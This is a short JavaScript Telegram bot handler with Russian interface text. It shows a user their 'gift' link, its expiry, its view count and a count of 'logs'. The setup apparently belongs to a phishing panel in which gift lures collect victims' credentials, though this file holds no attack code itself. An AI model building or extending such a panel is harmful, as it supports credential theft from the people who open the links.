const { Markup } = require("telegraf");
const { Ad, Log } = require("../database");
const myLinks = require("./myLinks");

const time = {1: "1 месяц", 3: "3 месяца", 12: "1 год"};

module.exports = async (ctx) => {
    let ad = await Ad.findOne({ code: ctx.match[1] });
    let text = "";
    if(ad){
        let logs = await Log.count({ adCode: ad.code });
        if(ad.userId != ctx.from.id){
            ctx.editOrReply(`❌ Вы не можете просматривать чужие объявления`)
            return;
        }
        text = `🎁 Гифт <b>${ad.code}</b>

🔗 Ссылка: <code>${ctx.state.domain}${ad.code}</code>

🕓 Срок: <b>${time[ad.expires]}</b>
👀 Просмотров: <code>${ad.views}</code>
🔫 Логов: <code>${logs || 0}</code>`
    }
    ctx.editOrReply(ad ? text : `❌ Гифт не найден!`, {
        parse_mode: "html",
        reply_markup: Markup.inlineKeyboard([
            (ad)
            ? [Markup.button.callback("❌ Удалить", "delete_ad_"+ad.code)]
            : [],
            [Markup.button.callback("◀️ В меню", "menu")]
        ]).reply_markup
    })
}